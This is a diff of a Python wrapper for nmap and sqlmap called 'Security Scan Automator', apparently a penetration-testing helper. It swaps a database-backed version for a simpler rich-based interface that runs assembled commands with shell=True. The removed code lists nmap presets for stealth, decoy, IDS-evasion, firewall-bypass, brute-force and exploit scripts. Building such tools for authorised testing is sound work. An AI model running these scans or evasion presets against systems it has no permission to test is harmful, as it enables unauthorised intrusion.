@@ -2,3325 +2,1140 @@
 
 import os
 import sys
-import json
-import time
-import random
-import socket
-import sqlite3
 import subprocess
-import re
-import threading
-import hashlib
-import base64
+import time
+import datetime
+import json
 import csv
-import xml.etree.ElementTree as ET
-from datetime import datetime, timedelta
-from urllib.parse import urlparse, urljoin
-import ipaddress
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import signal
-from pathlib import Path
 import shutil
-import zipfile
+from pathlib import Path
+from collections import defaultdict
 
-class Colors:
-    RED = '\033[91m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    BLUE = '\033[94m'
-    MAGENTA = '\033[95m'
-    CYAN = '\033[96m'
-    WHITE = '\033[97m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-    END = '\033[0m'
-    BLINK = '\033[5m'
-    BG_RED = '\033[41m'
-    BG_GREEN = '\033[42m'
-    BG_YELLOW = '\033[43m'
-    BG_BLUE = '\033[44m'
-    GRAY = '\033[90m'
-    BRIGHT_RED = '\033[91m'
-    BRIGHT_GREEN = '\033[92m'
-    BRIGHT_YELLOW = '\033[93m'
-    BRIGHT_BLUE = '\033[94m'
-    BRIGHT_MAGENTA = '\033[95m'
-    BRIGHT_CYAN = '\033[96m'
-    BRIGHT_WHITE = '\033[97m'
+try:
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich.table import Table
+    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
+    from rich.prompt import Prompt, Confirm
+    from rich.markdown import Markdown
+    from rich.text import Text
+    from rich import box
+    from rich.align import Align
+    from rich.columns import Columns
+    from rich.live import Live
+except ImportError:
+    print("Installing required packages...")
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "rich"])
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich.table import Table
+    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
+    from rich.prompt import Prompt, Confirm
+    from rich.markdown import Markdown
+    from rich.text import Text
+    from rich import box
+    from rich.align import Align
+    from rich.columns import Columns
+    from rich.live import Live
 
-class Icons:
-    SCAN = "🔍"
-    SHIELD = "🛡️"
-    WARNING = "⚠️"
-    SUCCESS = "✅"
-    ERROR = "❌"
-    INFO = "ℹ️"
-    ROCKET = "🚀"
-    TARGET = "🎯"
-    LOCK = "🔒"
-    KEY = "🔑"
-    GEAR = "⚙️"
-    BOOK = "📚"
-    CHART = "📊"
-    FIRE = "🔥"
-    STAR = "⭐"
-    ARROW = "➤"
-    BULLET = "•"
-    DIAMOND = "◆"
-    SQUARE = "■"
-    CIRCLE = "●"
-    CLOCK = "🕐"
-    LAPTOP = "💻"
-    NETWORK = "🌐"
-    DATABASE = "🗄️"
-    EXPORT = "📤"
-    IMPORT = "📥"
-    SEARCH = "🔎"
-    FILTER = "🔽"
-    BATCH = "📦"
-    MONITOR = "📡"
-    EXPLOIT = "💥"
-    PAYLOAD = "🎯"
-    SAVE = "💾"
-    FOLDER = "📁"
-    TRASH = "🗑️"
-    EDIT = "✏️"
-    COPY = "📋"
-    DOWNLOAD = "⬇️"
-    UPLOAD = "⬆️"
+console = Console()
 
-class InputValidator:
-    @staticmethod
-    def validate_menu_choice(choice, max_option):
+class SecurityScanner:
+    def __init__(self):
+        self.author = "@mikropsoft"
+        self.log_dir = Path("logs")
+        self.export_dir = Path("exports")
+        self.profiles_dir = Path("profiles")
+        self.log_dir.mkdir(exist_ok=True)
+        self.export_dir.mkdir(exist_ok=True)
+        self.profiles_dir.mkdir(exist_ok=True)
+        self.nmap_installed = False
+        self.sqlmap_installed = False
+        self.nmap_version = ""
+        self.sqlmap_version = ""
+        self.scan_history = []
+        self.load_history()
+        
+    def clear_screen(self):
+        os.system('clear' if os.name != 'nt' else 'cls')
+        
+    def animate_loading(self, message, duration=0.8):
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[bold cyan]{task.description}"),
+            console=console,
+        ) as progress:
+            task = progress.add_task(message, total=100)
+            for _ in range(100):
+                time.sleep(duration/100)
+                progress.update(task, advance=1)
+    
+    def show_banner(self):
+        banner_text = Text()
+        banner_text.append("\n")
+        banner_text.append("     ███████╗███████╗ ██████╗███████╗ ██████╗ █████╗ ███╗   ██╗\n", style="bold cyan")
+        banner_text.append("     ██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝██╔══██╗████╗  ██║\n", style="bold cyan")
+        banner_text.append("     ███████╗█████╗  ██║     ███████╗██║     ███████║██╔██╗ ██║\n", style="bold cyan")
+        banner_text.append("     ╚════██║██╔══╝  ██║     ╚════██║██║     ██╔══██║██║╚██╗██║\n", style="bold cyan")
+        banner_text.append("     ███████║███████╗╚██████╗███████║╚██████╗██║  ██║██║ ╚████║\n", style="bold cyan")
+        banner_text.append("     ╚══════╝╚══════╝ ╚═════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝\n", style="bold cyan")
+        banner_text.append("\n")
+        banner_text.append("              🛡️  Security Scan Automator  🛡️\n", style="bold white")
+        banner_text.append("         Advanced Penetration Testing Framework\n", style="dim white")
+        banner_text.append(f"\n                  Created by {self.author}\n", style="bold yellow")
+        
+        console.print(Align.center(banner_text))
+        
+    def validate_input(self, prompt_text, valid_choices=None, allow_empty=False):
+        while True:
+            user_input = Prompt.ask(prompt_text).strip()
+            
+            if not user_input and not allow_empty:
+                console.print("[red]❌ Input cannot be empty[/red]")
+                time.sleep(0.5)
+                continue
+                
+            if user_input and len(user_input) > 500:
+                console.print("[red]❌ Input too long (max 500 characters)[/red]")
+                time.sleep(0.5)
+                continue
+            
+            if valid_choices and user_input not in valid_choices:
+                console.print(f"[red]❌ Invalid choice. Please select from: {', '.join(valid_choices)}[/red]")
+                time.sleep(0.5)
+                continue
+                
+            return user_input
+    
+    def check_command_installed(self, command):
         try:
-            if not choice or not choice.strip():
-                return False, "Empty input"
-            
-            choice = choice.strip()
-            
-            if not choice.isdigit():
-                return False, "Input must be a number"
-            
-            choice_num = int(choice)
-            if choice_num < 0 or choice_num > max_option:
-                return False, f"Number must be between 0 and {max_option}"
-            
-            return True, choice_num
-        except ValueError:
-            return False, "Invalid number format"
+            result = subprocess.run(
+                [command, "--version"],
+                capture_output=True,
+                text=True,
+                timeout=5
+            )
+            return True, result.stdout.strip().split('\n')[0] if result.returncode == 0 else ""
+        except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
+            return False, ""
+    
+    def get_network_info(self):
+        try:
+            if os.name != 'nt':
+                result = subprocess.run(
+                    ["ip", "addr"],
+                    capture_output=True,
+                    text=True,
+                    timeout=3
+                )
+                return result.stdout if result.returncode == 0 else "Network info unavailable"
+            else:
+                result = subprocess.run(
+                    ["ipconfig"],
+                    capture_output=True,
+                    text=True,
+                    timeout=3
+                )
+                return result.stdout if result.returncode == 0 else "Network info unavailable"
         except Exception:
-            return False, "Unknown validation error"
+            return "Network info unavailable"
     
-    @staticmethod
-    def validate_ip(ip):
-        if not ip or not isinstance(ip, str):
-            return False
-        try:
-            ipaddress.ip_address(ip.strip())
-            return True
-        except (ValueError, AttributeError):
-            return False
+    def check_dependencies(self):
+        self.clear_screen()
+        self.show_banner()
+        
+        console.print("\n")
+        console.print(Align.center("[bold yellow]🔍 System Dependency Check[/bold yellow]"))
+        console.print("\n")
+        
+        dep_table = Table(show_header=True, header_style="bold magenta", box=box.DOUBLE, expand=True)
+        dep_table.add_column("🔧 Tool", style="cyan", width=20, justify="center")
+        dep_table.add_column("📊 Status", width=20, justify="center")
+        dep_table.add_column("📌 Version", width=50)
+        
+        self.nmap_installed, self.nmap_version = self.check_command_installed("nmap")
+        nmap_status = "[bold green]✅ Installed[/bold green]" if self.nmap_installed else "[bold red]❌ Missing[/bold red]"
+        dep_table.add_row("Nmap", nmap_status, self.nmap_version if self.nmap_installed else "Not Found")
+        
+        self.sqlmap_installed, self.sqlmap_version = self.check_command_installed("sqlmap")
+        sqlmap_status = "[bold green]✅ Installed[/bold green]" if self.sqlmap_installed else "[bold red]❌ Missing[/bold red]"
+        dep_table.add_row("SQLMap", sqlmap_status, self.sqlmap_version if self.sqlmap_installed else "Not Found")
+        
+        python_version = sys.version.split()[0]
+        dep_table.add_row("Python", "[bold green]✅ Running[/bold green]", f"Python {python_version}")
+        
+        console.print(dep_table)
+        
+        if not self.nmap_installed or not self.sqlmap_installed:
+            console.print("\n")
+            console.print(Panel(
+                "[bold red]⚠️  Warning: Some dependencies are missing![/bold red]\n\n"
+                "[yellow]Installation Commands:[/yellow]\n"
+                "  • Nmap: [cyan]sudo apt-get install nmap[/cyan] (Debian/Ubuntu)\n"
+                "          [cyan]brew install nmap[/cyan] (macOS)\n"
+                "  • SQLMap: [cyan]sudo apt-get install sqlmap[/cyan] (Debian/Ubuntu)\n"
+                "            [cyan]pip install sqlmap[/cyan]",
+                title="[bold red]Missing Dependencies[/bold red]",
+                border_style="red"
+            ))
+            if not Confirm.ask("\n[yellow]Continue anyway?[/yellow]", default=False):
+                sys.exit(0)
+        else:
+            console.print("\n")
+            console.print(Align.center("[bold green]✅ All dependencies are installed and ready![/bold green]"))
+        
+        time.sleep(2)
     
-    @staticmethod
-    def validate_url(url):
-        if not url or not isinstance(url, str):
-            return False
-        try:
-            result = urlparse(url.strip())
-            return bool(result.scheme and result.netloc)
-        except Exception:
-            return False
-    
-    @staticmethod
-    def validate_target(target):
-        if not target or not isinstance(target, str):
-            return False, "empty"
-        
-        target = target.strip()
-        
-        if InputValidator.validate_ip(target):
-            return True, "ip"
-        
-        if InputValidator.validate_url(target):
-            return True, "url"
-        
-        if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?(\.[a-zA-Z]{2,})+$', target):
-            return True, "domain"
-        
-        return False, "invalid"
-    
-    @staticmethod
-    def validate_filename(filename):
-        if not filename or not isinstance(filename, str):
-            return False
-        
-        invalid_chars = '<>:"/\\|?*'
-        return not any(char in filename for char in invalid_chars) and len(filename.strip()) > 0
-    
-    @staticmethod
-    def get_valid_input(prompt, validator_func=None, max_attempts=3):
-        attempts = 0
-        while attempts < max_attempts:
+    def load_history(self):
+        history_file = self.log_dir / "scan_history.json"
+        if history_file.exists():
             try:
-                user_input = input(prompt).strip()
-                
-                if validator_func:
-                    is_valid, result = validator_func(user_input)
-                    if is_valid:
-                        return result
-                    else:
-                        print(f"{Colors.RED}{Icons.ERROR} {result}{Colors.END}")
-                        attempts += 1
-                else:
-                    return user_input
-                    
-            except (KeyboardInterrupt, EOFError):
-                return None
-            except Exception as e:
-                print(f"{Colors.RED}{Icons.ERROR} Input error: {e}{Colors.END}")
-                attempts += 1
+                with open(history_file, 'r') as f:
+                    self.scan_history = json.load(f)
+            except Exception:
+                self.scan_history = []
+    
+    def save_history(self, scan_data):
+        self.scan_history.append(scan_data)
+        history_file = self.log_dir / "scan_history.json"
+        with open(history_file, 'w') as f:
+            json.dump(self.scan_history, f, indent=2)
+    
+    def log_scan(self, scan_type, command, output, target="", duration=0):
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        log_filename = f"{scan_type}_{timestamp}.log"
+        log_path = self.log_dir / log_filename
         
-        print(f"{Colors.RED}{Icons.ERROR} Maximum attempts reached{Colors.END}")
-        return None
-
-class QuoteGenerator:
-    QUOTES = [
-        "Security is a process, not a product.",
-        "The best defense is a good offense!",
-        "Every port tells a story.",
-        "Vulnerability scanning saves systems.",
-        "Penetration testing prevents penetration.",
-        "Code without testing is like a lock without a key.",
-        "The weakest link defines the strength of the chain.",
-        "Security through obscurity is not security.",
-        "Trust, but verify... then test again.",
-        "A secure system is a tested system.",
-        "In cybersecurity, paranoia is a virtue.",
-        "The only secure computer is one that's unplugged.",
-        "Attack is the best form of defense in pentesting.",
-        "Knowledge is power, but verification is security.",
-        "Every vulnerability found is a lesson learned."
-    ]
-    
-    @staticmethod
-    def get_daily_quote():
-        try:
-            today = datetime.now().strftime("%Y%m%d")
-            random.seed(today)
-            return random.choice(QuoteGenerator.QUOTES)
-        except Exception:
-            return "Stay secure and keep testing!"
-
-class ConfigManager:
-    def __init__(self):
-        self.config_file = "secscan_config.json"
-        self.default_config = {
-            'theme': 'dark',
-            'username': 'SecScanUser',
-            'created_date': datetime.now().isoformat(),
-            'total_scans': 0,
-            'favorite_scans': [],
-            'recent_scans': [],
-            'scan_templates': {},
-            'target_groups': {},
-            'advanced_settings': {
-                'auto_save_reports': True,
-                'show_progress': True,
-                'sound_alerts': False,
-                'highlight_keywords': True,
-                'report_format': 'html',
-                'concurrent_scans': 5,
-                'timeout_duration': 300,
-                'max_report_age_days': 30,
-                'auto_backup': True,
-                'export_format': 'json'
-            }
+        log_data = {
+            "timestamp": datetime.datetime.now().isoformat(),
+            "scan_type": scan_type,
+            "target": target,
+            "command": command,
+            "output": output,
+            "duration": duration,
+            "status": "completed",
+            "log_file": str(log_path)
         }
-        self.config = self._load_config()
-        self._lock = threading.Lock()
+        
+        with open(log_path, 'w') as f:
+            json.dump(log_data, f, indent=2)
+            f.write("\n\n" + "="*80 + "\n")
+            f.write("COMMAND OUTPUT:\n")
+            f.write("="*80 + "\n\n")
+            f.write(output)
+        
+        self.save_history(log_data)
+        
+        return log_path, log_data
     
-    def _load_config(self):
+    def execute_command(self, command, scan_type, target=""):
         try:
-            if os.path.exists(self.config_file):
-                with open(self.config_file, 'r', encoding='utf-8') as f:
-                    config = json.load(f)
-                    merged_config = self.default_config.copy()
-                    self._deep_merge(merged_config, config)
-                    return merged_config
-            return self.default_config.copy()
-        except Exception:
-            return self.default_config.copy()
-    
-    def _deep_merge(self, base_dict, update_dict):
-        for key, value in update_dict.items():
-            if key in base_dict and isinstance(base_dict[key], dict) and isinstance(value, dict):
-                self._deep_merge(base_dict[key], value)
-            else:
-                base_dict[key] = value
-    
-    def save_config(self):
-        try:
-            with self._lock:
-                with open(self.config_file, 'w', encoding='utf-8') as f:
-                    json.dump(self.config, f, indent=2, ensure_ascii=False)
-            return True
-        except Exception:
-            return False
-    
-    def get(self, key, default=None):
-        try:
-            keys = key.split('.')
-            value = self.config
-            for k in keys:
-                value = value.get(k, default)
-                if value is None:
-                    return default
-            return value
-        except Exception:
-            return default
-    
-    def set(self, key, value):
-        try:
-            if not key or value is None:
-                return False
+            console.print("\n")
+            console.print(Panel(
+                f"[bold yellow]Command:[/bold yellow] [cyan]{command}[/cyan]\n"
+                f"[bold yellow]Target:[/bold yellow] [cyan]{target}[/cyan]",
+                title="[bold green]🚀 Executing Scan[/bold green]",
+                border_style="green"
+            ))
             
-            keys = key.split('.')
-            config = self.config
+            start_time = time.time()
             
-            for k in keys[:-1]:
-                if k not in config:
-                    config[k] = {}
-                config = config[k]
-            
-            config[keys[-1]] = value
-            return self.save_config()
-        except Exception:
-            return False
-    
-    def increment_scan_count(self):
-        try:
-            current_count = self.get('total_scans', 0)
-            return self.set('total_scans', current_count + 1)
-        except Exception:
-            return False
-    
-    def add_recent_scan(self, scan_info):
-        try:
-            recent_scans = self.get('recent_scans', [])
-            recent_scans.insert(0, scan_info)
-            recent_scans = recent_scans[:10]  # Keep only last 10
-            return self.set('recent_scans', recent_scans)
-        except Exception:
-            return False
-    
-    def backup_config(self, backup_dir="backups"):
-        try:
-            if not os.path.exists(backup_dir):
-                os.makedirs(backup_dir)
-            
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            backup_file = os.path.join(backup_dir, f"config_backup_{timestamp}.json")
-            
-            shutil.copy2(self.config_file, backup_file)
-            return backup_file
-        except Exception:
-            return None
-
-class DatabaseManager:
-    def __init__(self):
-        self.db_file = "secscan.db"
-        self._lock = threading.Lock()
-        self._init_database()
-    
-    def _init_database(self):
-        try:
-            conn = sqlite3.connect(self.db_file, timeout=10)
-            cursor = conn.cursor()
-            
-            tables = [
-                '''CREATE TABLE IF NOT EXISTS reports (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    name TEXT NOT NULL,
-                    target TEXT NOT NULL,
-                    scan_type TEXT NOT NULL,
-                    mode TEXT NOT NULL,
-                    created_date TEXT NOT NULL,
-                    file_path TEXT NOT NULL,
-                    notes TEXT,
-                    status TEXT DEFAULT 'completed',
-                    duration REAL DEFAULT 0,
-                    vulnerability_count INTEGER DEFAULT 0,
-                    risk_score REAL DEFAULT 0,
-                    command_used TEXT,
-                    file_size INTEGER DEFAULT 0
-                )''',
-                '''CREATE TABLE IF NOT EXISTS scan_history (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    target TEXT NOT NULL,
-                    scan_type TEXT NOT NULL,
-                    mode TEXT NOT NULL,
-                    command TEXT NOT NULL,
-                    result TEXT,
-                    duration REAL,
-                    created_date TEXT NOT NULL,
-                    status TEXT DEFAULT 'completed',
-                    ports_found INTEGER DEFAULT 0,
-                    vulnerabilities_found INTEGER DEFAULT 0
-                )''',
-                '''CREATE TABLE IF NOT EXISTS error_logs (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    error_type TEXT NOT NULL,
-                    error_message TEXT NOT NULL,
-                    stack_trace TEXT,
-                    created_date TEXT NOT NULL,
-                    severity TEXT DEFAULT 'medium'
-                )''',
-                '''CREATE TABLE IF NOT EXISTS targets (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    target TEXT UNIQUE NOT NULL,
-                    target_type TEXT NOT NULL,
-                    group_name TEXT,
-                    notes TEXT,
-                    last_scanned TEXT,
-                    scan_count INTEGER DEFAULT 0,
-                    risk_level TEXT DEFAULT 'unknown',
-                    created_date TEXT NOT NULL
-                )''',
-                '''CREATE TABLE IF NOT EXISTS vulnerabilities (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    target TEXT NOT NULL,
-                    vulnerability_type TEXT NOT NULL,
-                    severity TEXT NOT NULL,
-                    description TEXT,
-                    port INTEGER,
-                    service TEXT,
-                    discovered_date TEXT NOT NULL,
-                    status TEXT DEFAULT 'open'
-                )'''
-            ]
-            
-            for table_sql in tables:
-                cursor.execute(table_sql)
-            
-            conn.commit()
-            conn.close()
-        except sqlite3.Error as e:
-            print(f"Database initialization error: {e}")
-    
-    def _execute_query(self, query, params=None, fetch=False, fetch_one=False):
-        try:
-            with self._lock:
-                conn = sqlite3.connect(self.db_file, timeout=10)
-                cursor = conn.cursor()
+            with Progress(
+                SpinnerColumn(),
+                TextColumn("[bold green]{task.description}"),
+                BarColumn(),
+                console=console,
+            ) as progress:
+                task = progress.add_task("Scanning in progress...", total=None)
                 
-                if params:
-                    cursor.execute(query, params)
-                else:
-                    cursor.execute(query)
-                
-                if fetch_one:
-                    result = cursor.fetchone()
-                elif fetch:
-                    result = cursor.fetchall()
-                else:
-                    result = cursor.rowcount > 0
-                
-                conn.commit()
-                conn.close()
-                return result
-        except sqlite3.Error as e:
-            self.log_error("DatabaseError", str(e))
-            return [] if fetch else None if fetch_one else False
-    
-    def add_scan_to_history(self, target, scan_type, mode, command, result="", duration=0, ports_found=0, vulns_found=0):
-        query = '''
-            INSERT INTO scan_history (target, scan_type, mode, command, result, duration, created_date, ports_found, vulnerabilities_found)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-        '''
-        params = (target, scan_type, mode, command, result, duration, datetime.now().isoformat(), ports_found, vulns_found)
-        return self._execute_query(query, params)
-    
-    def add_report(self, name, target, scan_type, mode, file_path, notes="", duration=0, vuln_count=0, risk_score=0, command=""):
-        try:
-            file_size = os.path.getsize(file_path) if os.path.exists(file_path) else 0
-            query = '''
-                INSERT INTO reports (name, target, scan_type, mode, created_date, file_path, notes, duration, vulnerability_count, risk_score, command_used, file_size)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-            '''
-            params = (name, target, scan_type, mode, datetime.now().isoformat(), file_path, notes, duration, vuln_count, risk_score, command, file_size)
-            return self._execute_query(query, params)
-        except Exception as e:
-            self.log_error("AddReport", str(e))
-            return False
-    
-    def get_reports(self, limit=50, search_term=None, scan_type=None, date_from=None, date_to=None):
-        try:
-            query = 'SELECT * FROM reports WHERE 1=1'
-            params = []
+                result = subprocess.run(
+                    command,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=600
+                )
             
-            if search_term:
-                query += ' AND (name LIKE ? OR target LIKE ? OR notes LIKE ?)'
-                search_pattern = f'%{search_term}%'
-                params.extend([search_pattern, search_pattern, search_pattern])
+            duration = time.time() - start_time
+            output = result.stdout + result.stderr
             
-            if scan_type:
-                query += ' AND scan_type = ?'
-                params.append(scan_type)
+            log_path, log_data = self.log_scan(scan_type, command, output, target, duration)
             
-            if date_from:
-                query += ' AND created_date >= ?'
-                params.append(date_from)
+            preview_length = 1500
+            output_preview = output[:preview_length] + "\n\n[yellow]...(output truncated)[/yellow]" if len(output) > preview_length else output
             
-            if date_to:
-                query += ' AND created_date <= ?'
-                params.append(date_to)
+            console.print("\n")
+            console.print(Panel(
+                output_preview,
+                title="[bold green]✅ Scan Results[/bold green]",
+                border_style="green",
+                expand=False
+            ))
             
-            query += ' ORDER BY created_date DESC LIMIT ?'
-            params.append(limit)
+            console.print("\n")
+            stats = Text()
+            stats.append("📊 Scan Statistics\n\n", style="bold cyan")
+            stats.append(f"⏱️  Duration: {duration:.2f} seconds\n", style="green")
+            stats.append(f"📁 Log File: {log_path.name}\n", style="cyan")
+            stats.append(f"📦 Output Size: {len(output)} bytes\n", style="yellow")
+            console.print(Panel(stats, border_style="blue"))
             
-            return self._execute_query(query, params, fetch=True)
-        except Exception as e:
-            self.log_error("GetReports", str(e))
-            return []
-    
-    def delete_report(self, report_id):
-        try:
-            # First get the file path to delete the file
-            report = self._execute_query('SELECT file_path FROM reports WHERE id = ?', (report_id,), fetch_one=True)
-            if report and os.path.exists(report[0]):
-                os.remove(report[0])
-            
-            # Then delete the database record
-            return self._execute_query('DELETE FROM reports WHERE id = ?', (report_id,))
-        except Exception as e:
-            self.log_error("DeleteReport", str(e))
-            return False
-    
-    def get_scan_statistics(self):
-        try:
-            stats = {}
-            
-            # Total counts
-            stats['total_scans'] = self._execute_query('SELECT COUNT(*) FROM scan_history', fetch_one=True)[0] or 0
-            stats['total_reports'] = self._execute_query('SELECT COUNT(*) FROM reports', fetch_one=True)[0] or 0
-            stats['total_vulnerabilities'] = self._execute_query('SELECT COUNT(*) FROM vulnerabilities', fetch_one=True)[0] or 0
-            stats['total_targets'] = self._execute_query('SELECT COUNT(*) FROM targets', fetch_one=True)[0] or 0
-            
-            # Recent activity (last 7 days)
-            week_ago = (datetime.now() - timedelta(days=7)).isoformat()
-            stats['recent_scans'] = self._execute_query('SELECT COUNT(*) FROM scan_history WHERE created_date >= ?', (week_ago,), fetch_one=True)[0] or 0
-            stats['recent_reports'] = self._execute_query('SELECT COUNT(*) FROM reports WHERE created_date >= ?', (week_ago,), fetch_one=True)[0] or 0
-            
-            # Scan type breakdown
-            nmap_scans = self._execute_query('SELECT COUNT(*) FROM scan_history WHERE scan_type = "nmap"', fetch_one=True)[0] or 0
-            sqlmap_scans = self._execute_query('SELECT COUNT(*) FROM scan_history WHERE scan_type = "sqlmap"', fetch_one=True)[0] or 0
-            stats['scan_breakdown'] = {'nmap': nmap_scans, 'sqlmap': sqlmap_scans}
-            
-            # Average scan duration
-            avg_duration = self._execute_query('SELECT AVG(duration) FROM scan_history WHERE duration > 0', fetch_one=True)
-            stats['average_scan_duration'] = round(avg_duration[0], 2) if avg_duration and avg_duration[0] else 0
-            
-            # Vulnerability severity breakdown
-            critical_vulns = self._execute_query('SELECT COUNT(*) FROM vulnerabilities WHERE severity = "critical"', fetch_one=True)[0] or 0
-            high_vulns = self._execute_query('SELECT COUNT(*) FROM vulnerabilities WHERE severity = "high"', fetch_one=True)[0] or 0
-            medium_vulns = self._execute_query('SELECT COUNT(*) FROM vulnerabilities WHERE severity = "medium"', fetch_one=True)[0] or 0
-            low_vulns = self._execute_query('SELECT COUNT(*) FROM vulnerabilities WHERE severity = "low"', fetch_one=True)[0] or 0
-            
-            stats['vulnerability_breakdown'] = {
-                'critical': critical_vulns,
-                'high': high_vulns,
-                'medium': medium_vulns,
-                'low': low_vulns
-            }
-            
-            # Recent errors count
-            stats['recent_errors'] = self._execute_query('SELECT COUNT(*) FROM error_logs WHERE created_date >= ?', (week_ago,), fetch_one=True)[0] or 0
-            
-            return stats
-        except Exception as e:
-            self.log_error("GetStatistics", str(e))
-            return {'total_scans': 0, 'total_reports': 0, 'total_vulnerabilities': 0, 'total_targets': 0}
-    
-    def log_error(self, error_type, error_message, stack_trace="", severity="medium"):
-        try:
-            query = '''
-                INSERT INTO error_logs (error_type, error_message, stack_trace, created_date, severity)
-                VALUES (?, ?, ?, ?, ?)
-            '''
-            params = (error_type, error_message, stack_trace, datetime.now().isoformat(), severity)
-            return self._execute_query(query, params)
-        except Exception:
-            return False
-    
-    def add_target(self, target, target_type, group_name="", notes=""):
-        try:
-            # Check if target already exists
-            existing = self._execute_query('SELECT id FROM targets WHERE target = ?', (target,), fetch_one=True)
-            
-            if existing:
-                # Update existing target
-                query = '''
-                    UPDATE targets SET last_scanned = ?, scan_count = scan_count + 1, notes = ?
-                    WHERE target = ?
-                '''
-                params = (datetime.now().isoformat(), notes, target)
-            else:
-                # Insert new target
-                query = '''
-                    INSERT INTO targets (target, target_type, group_name, notes, last_scanned, scan_count, created_date)
-                    VALUES (?, ?, ?, ?, ?, 1, ?)
-                '''
-                params = (target, target_type, group_name, notes, datetime.now().isoformat(), datetime.now().isoformat())
-            
-            return self._execute_query(query, params)
-        except Exception as e:
-            self.log_error("AddTarget", str(e))
-            return False
-    
-    def get_targets(self, group_name=None, limit=100):
-        try:
-            query = 'SELECT * FROM targets'
-            params = []
-            
-            if group_name:
-                query += ' WHERE group_name = ?'
-                params.append(group_name)
-            
-            query += ' ORDER BY last_scanned DESC LIMIT ?'
-            params.append(limit)
-            
-            return self._execute_query(query, params, fetch=True)
-        except Exception as e:
-            self.log_error("GetTargets", str(e))
-            return []
-    
-    def cleanup_old_data(self, days=30):
-        try:
-            cutoff_date = (datetime.now() - timedelta(days=days)).isoformat()
-            
-            # Clean old error logs
-            self._execute_query('DELETE FROM error_logs WHERE created_date < ?', (cutoff_date,))
-            
-            # Clean old scan history (keep important ones)
-            self._execute_query('DELETE FROM scan_history WHERE created_date < ? AND vulnerabilities_found = 0', (cutoff_date,))
+            if Confirm.ask("\n[cyan]Export results?[/cyan]", default=False):
+                self.export_scan_results(log_data)
             
             return True
-        except Exception as e:
-            self.log_error("CleanupData", str(e))
+            
+        except subprocess.TimeoutExpired:
+            console.print("\n[bold red]❌ Error: Scan timeout (>10 minutes)[/bold red]")
             return False
-
-class ScanTemplates:
-    NMAP_TEMPLATES = {
-        'easy': [
-            {'name': 'Quick Port Scan', 'command': '-F', 'description': 'Scan most common ports quickly'},
-            {'name': 'Basic TCP Scan', 'command': '-sS', 'description': 'SYN scan for port detection'},
-            {'name': 'Ping Scan', 'command': '-sn', 'description': 'Check if target is active'},
-            {'name': 'OS Detection', 'command': '-O', 'description': 'Detect operating system'},
-            {'name': 'Service Version', 'command': '-sV', 'description': 'Detect service versions'},
-            {'name': 'UDP Top Ports', 'command': '-sU --top-ports 100', 'description': 'Scan top 100 UDP ports'},
-            {'name': 'HTTP Scripts', 'command': '--script http-*', 'description': 'Run HTTP-related scripts'},
-            {'name': 'SSL Scripts', 'command': '--script ssl-*', 'description': 'Test SSL/TLS configuration'},
-            {'name': 'SMB Scripts', 'command': '--script smb-*', 'description': 'Test SMB shares and security'},
-            {'name': 'DNS Scripts', 'command': '--script dns-*', 'description': 'DNS enumeration and testing'}
-        ],
-        'medium': [
-            {'name': 'Comprehensive Scan', 'command': '-A', 'description': 'Aggressive scan with OS and version detection'},
-            {'name': 'All Ports Scan', 'command': '-p-', 'description': 'Scan all 65535 ports'},
-            {'name': 'Stealth Scan', 'command': '-sS -Pn', 'description': 'Stealth SYN scan without ping'},
-            {'name': 'UDP Scan', 'command': '-sU -p 1-1000', 'description': 'Scan first 1000 UDP ports'},
-            {'name': 'Script Scan', 'command': '--script default,safe', 'description': 'Run default and safe scripts'},
-            {'name': 'Vulnerability Scan', 'command': '--script vuln', 'description': 'Scan for known vulnerabilities'},
-            {'name': 'Timing Template 4', 'command': '-T4', 'description': 'Aggressive timing template'},
-            {'name': 'Fragment Packets', 'command': '-f', 'description': 'Fragment packets to avoid detection'},
-            {'name': 'Decoy Scan', 'command': '-D RND:5', 'description': 'Use random decoy addresses'},
-            {'name': 'Source Port', 'command': '--source-port 53', 'description': 'Use DNS source port for evasion'}
-        ],
-        'hard': [
-            {'name': 'Full Stealth Scan', 'command': '-sS -O -sV --script vuln -T4', 'description': 'Complete stealth reconnaissance'},
-            {'name': 'Evasion Scan', 'command': '-f -D RND:10 --source-port 53 -T1', 'description': 'Maximum evasion techniques'},
-            {'name': 'All Ports + Scripts', 'command': '-p- --script all', 'description': 'Scan all ports with all scripts'},
-            {'name': 'Brute Force', 'command': '--script brute', 'description': 'Brute force login attempts'},
-            {'name': 'Exploit Scan', 'command': '--script exploit', 'description': 'Test for exploitable vulnerabilities'},
-            {'name': 'Malware Detection', 'command': '--script malware', 'description': 'Detect malware infections'},
-            {'name': 'Advanced Vuln Scan', 'command': '--script vuln,exploit --script-args unsafe=1', 'description': 'Dangerous vulnerability testing'},
-            {'name': 'Firewall Bypass', 'command': '--script firewall-bypass', 'description': 'Test firewall bypass techniques'},
-            {'name': 'IDS Evasion', 'command': '--scan-delay 5s --max-rate 1 -T1', 'description': 'Slow scan to evade IDS'},
-            {'name': 'IPv6 Scan', 'command': '-6 --script ipv6-*', 'description': 'IPv6 network scanning'}
-        ]
-    }
-    
-    SQLMAP_TEMPLATES = {
-        'easy': [
